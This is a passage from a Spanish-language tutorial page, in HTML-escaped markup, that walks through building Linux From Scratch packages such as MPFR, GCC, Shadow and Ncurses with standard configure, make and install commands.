            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/mpfr-4.0.2

make
make html
make check
make &lt;span class=&quot;nb&quot;&gt;install
&lt;/span&gt;make install-html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;mpc-en-lfs&quot;&gt;MPC en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/mpc-1.1.0

make
make html
make check
make &lt;span class=&quot;nb&quot;&gt;install
&lt;/span&gt;make install-html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;attr-en-lfs&quot;&gt;Attr en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--bindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--sysconfdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/attr-2.4.48

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/libattr.so.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../../lib/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; /usr/lib/libattr.so&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; /usr/lib/libattr.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;acl-en-lfs&quot;&gt;Acl en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--bindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--libexecdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/lib &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/acl-2.2.53

make
make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/libacl.so.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../../lib/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; /usr/lib/libacl.so&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; /usr/lib/libacl.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;instalación-del-shadow&quot;&gt;Instalación del Shadow&lt;/h5&gt;

&lt;p&gt;Para configurar el &lt;strong&gt;Shadow&lt;/strong&gt; en nuestro sistema Linux, comenzaremos descomprimiendo el comprimido correspondiente. Posteriormente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/groups$(EXEEXT) //'&lt;/span&gt; src/Makefile.in
find man &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; Makefile.in &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/groups\.1 / /'&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
find man &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; Makefile.in &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/getspnam\.3 / /'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
find man &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; Makefile.in &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/passwd\.5 / /'&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@#ENCRYPT_METHOD DES@ENCRYPT_METHOD SHA512@'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
       &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@/var/spool/mail@/var/mail@'&lt;/span&gt; etc/login.defs

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@DICTPATH.*@DICTPATH\t/lib/cracklib/pw_dict@'&lt;/span&gt; etc/login.defs
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/1000/999/'&lt;/span&gt; etc/useradd
./configure &lt;span class=&quot;nt&quot;&gt;--sysconfdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc &lt;span class=&quot;nt&quot;&gt;--with-group-name-max-length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;32

make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, configuramos el shadow habilitando las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shadowed passwords&lt;/code&gt; y las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shadowed group passwords&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pwconv
grpconv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Por último, asignaremos una contraseña al usuario root:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;passwd root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349QH.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;gcc-en-lfs&quot;&gt;GCC en LFS&lt;/h5&gt;

&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: La instalación de este paquete puede demorar MUCHO tiempo, así que paciencia.&lt;/p&gt;

&lt;p&gt;Comenzaremos descomprimiendo el comprimido correspondiente. Una vez hecho, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
  &lt;/span&gt;x86_64&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/m64=/s/lib64/lib/'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;.orig gcc/config/i386/t-linux64
  &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1161 s|^|//|'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; libsanitizer/sanitizer_common/sanitizer_platform_limits_posix.cc

&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; build
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build

&lt;span class=&quot;nv&quot;&gt;SED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt;                               &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
../configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--enable-languages&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c,c++ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-multilib&lt;/span&gt;       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--disable-bootstrap&lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;--with-system-zlib&lt;/span&gt;

make

&lt;span class=&quot;nb&quot;&gt;ulimit&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 32768

&lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Rv&lt;/span&gt; nobody &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 
su nobody &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PATH=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; make -k check&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Es normal que puedan salir errores en la ejecución de este comando, no hay de qué preocuparse.&lt;/span&gt;

../contrib/test_summary
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, proseguiremos con la instalación:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make &lt;span class=&quot;nb&quot;&gt;install
rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /usr/lib/gcc/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-dumpmachine&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;/9.2.0/include-fixed/bits/

&lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; root:root &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    /usr/lib/gcc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;linux-gnu/9.2.0/include&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;,-fixed&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; ../usr/bin/cpp /lib

&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; gcc /usr/bin/cc

&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dm755&lt;/span&gt; /usr/lib/bfd-plugins
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../../libexec/gcc/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-dumpmachine&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;/9.2.0/liblto_plugin.so &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        /usr/lib/bfd-plugins/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;¿Hay alguna forma en este punto de saber si la instalación se ha realizado con éxito?, efectivamente, tenemos una forma.&lt;/p&gt;

&lt;p&gt;La idea será ejecutar los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'int main(){}'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dummy.c
cc dummy.c &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wl&lt;/span&gt;,--verbose &amp;amp;&amp;gt; dummy.log
readelf &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; a.out | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;': /lib'&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/usr/lib.*/crt[1in].*succeeded'&lt;/span&gt; dummy.log

&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-B4&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'^ /usr/include'&lt;/span&gt; dummy.log

&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SEARCH.*/usr/lib'&lt;/span&gt; dummy.log |sed &lt;span class=&quot;s1&quot;&gt;'s|; |\n|g'&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/lib.*/libc.so.6 &quot;&lt;/span&gt; dummy.log

&lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;found dummy.log

&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; dummy.c a.out dummy.log

&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pv&lt;/span&gt; /usr/share/gdb/auto-load/usr/lib
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;gdb.py /usr/share/gdb/auto-load/usr/lib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para saber si todo está en orden, deberás comparar el output con lo siguiente que me sale a mi:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34ap1.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Si los outputs te coinciden por la ejecución de cada comando aislado, entonces está todo correcto y podrás continuar.&lt;/p&gt;

&lt;p&gt;Como esta fase ha llevado mucho tiempo, lo suyo será hacer otra Snapshot:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34ape.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;¡No te olvides de retroceder los directorios correspondientes y borrar el directorio principal del archivo descomprimido!&lt;/p&gt;

&lt;h5 id=&quot;pk-config-en-lfs&quot;&gt;Pk config en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr              &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-internal-glib&lt;/span&gt;       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-host-tool&lt;/span&gt;        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/pkg-config-0.29.2

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;ncurses-en-lfs&quot;&gt;Ncurses en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/LIBTOOL_INSTALL/d'&lt;/span&gt; c++/Makefile.in

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--mandir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/man &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-shared&lt;/span&gt;           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--without-debug&lt;/span&gt;         &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--without-normal&lt;/span&gt;        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-pc-files&lt;/span&gt;       &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-widec&lt;/span&gt;

make
make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/lib/libncursesw.so.6&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /lib
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../../lib/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; /usr/lib/libncursesw.so&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; /usr/lib/libncursesw.so

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;lib &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;ncurses form panel menu &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vf&lt;/span&gt;                    /usr/lib/lib&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;.so
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;INPUT(-l&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;w)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/lib/lib&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;.so
    &lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;w.pc        /usr/lib/pkgconfig/&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;.pc
&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vf&lt;/span&gt;                     /usr/lib/libcursesw.so
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;INPUT(-lncursesw)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/lib/libcursesw.so
&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; libncurses.so      /usr/lib/libcurses.so

&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;       /usr/share/doc/ncurses-6.2
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /usr/share/doc/ncurses-6.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;libcap-en-lfs&quot;&gt;Libcap en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/install.*STA...LIBNAME/d'&lt;/span&gt; libcap/Makefile
make &lt;span class=&quot;nv&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lib
make &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;lib &lt;span class=&quot;nb&quot;&gt;install
chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 755 /lib/libcap.so.2.31
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;sed-en-lfs&quot;&gt;Sed en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

